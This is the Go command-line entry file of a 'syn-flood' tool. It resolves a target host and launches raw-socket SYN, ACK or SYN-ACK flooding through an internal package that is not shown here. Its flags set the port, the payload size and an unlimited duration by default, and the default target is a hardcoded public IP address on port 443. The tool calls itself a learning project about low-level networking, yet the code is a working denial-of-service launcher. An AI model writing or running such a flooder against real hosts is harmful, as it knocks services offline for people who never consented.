package cmd

import (
	"context"
	"github.com/bilalcaliskan/syn-flood/internal/options"
	"github.com/bilalcaliskan/syn-flood/internal/raw"
	"github.com/dimiro1/banner"
	"io/ioutil"
	"log"
	"net"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/spf13/cobra"
)

const (
	IpRegex  = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
	DnsRegex = "^(([a-zA-Z]|[a-zA-Z][a-zA-Z0-9\\-]*[a-zA-Z0-9])\\.)*([A-Za-z]|[A-Za-z][A-Za-z0-9\\-]*[A-Za-z0-9])$"
)

var (
	// rootCmd represents the base command when called without any subcommands
	rootCmd = &cobra.Command{
		Use:   "syn-flood",
		Short: "A simple flooding tool written with Golang",
		Long: `This project is developed with the objective of learning low level network
operations with Golang. It starts a syn flood attack with raw sockets.
Please do not use that tool with devil needs.
`,
		Run: func(cmd *cobra.Command, args []string) {
			if isIP, err = regexp.MatchString(IpRegex, host); err != nil {
				log.Fatalf("a fatal error occured while matching provided --host with IP regex: %s", err.Error())
			}

			if isDNS, err = regexp.MatchString(DnsRegex, host); err != nil {
				log.Fatalf("a fatal error occured while matching provided --host with DNS regex: %s", err.Error())
			}

			if !isIP && isDNS {
				log.Printf("%s is a DNS record, making DNS lookup\n", host)
				ipRecords, err := net.DefaultResolver.LookupIP(context.Background(), "ip4", host)
				if err != nil {
					log.Fatalf("an error occured on dns lookup: %s", err.Error())
				}

				log.Printf("dns lookup succeeded, found %s for %s\n", ipRecords[0].String(), host)
				host = ipRecords[0].String()
			}

			go func() {
				if err = raw.StartFlooding(host, sfo.Port, sfo.PayloadLength, sfo.FloodType); err != nil {
					log.Fatalf("an error occured on flooding process: %s", err.Error())
				}
			}()

			if sfo.FloodDurationSeconds != -1 {
				ctx, cancel = context.WithDeadline(ctx, time.Now().Add(time.Duration(sfo.FloodDurationSeconds)*time.Second))
				defer cancel()
			}

			for {
				<-ctx.Done()
				log.Printf("\n\nexecution completed with specified duration seconds %d\n", sfo.FloodDurationSeconds)
				os.Exit(0)
			}
		},
	}
	isIP, isDNS bool
	err         error
	sfo         = options.GetSynFloodOptions()
	host        = sfo.Host
	ctx         = context.Background()
	cancel      context.CancelFunc
)

// Execute adds all child commands to the root command and sets flags appropriately.
// This is called by main.main(). It only needs to happen once to the rootCmd.
func Execute() {
	bannerBytes, _ := ioutil.ReadFile("banner.txt")
	banner.Init(os.Stdout, true, false, strings.NewReader(string(bannerBytes)))

	err := rootCmd.Execute()
	if err != nil {
		os.Exit(1)
	}
}

func init() {
	opts := options.GetSynFloodOptions()

	rootCmd.PersistentFlags().StringVarP(&opts.Host, "host", "",
		"213.238.175.187", "Provide public ip or DNS of the target")
	rootCmd.PersistentFlags().IntVarP(&opts.Port, "port", "", 443,
		"Provide reachable port of the target")
	rootCmd.PersistentFlags().IntVarP(&opts.PayloadLength, "payloadLength", "",
		1400, "Provide payload length in bytes for each SYN packet")
	rootCmd.PersistentFlags().StringVarP(&opts.FloodType, "floodType", "", "syn",
		"Provide the attack type. Proper values are: syn, ack, synack")
	rootCmd.PersistentFlags().Int64VarP(&opts.FloodDurationSeconds, "floodDurationSeconds",
		"", -1, "Provide the duration of the attack in seconds, -1 for no limit, defaults to -1")
}
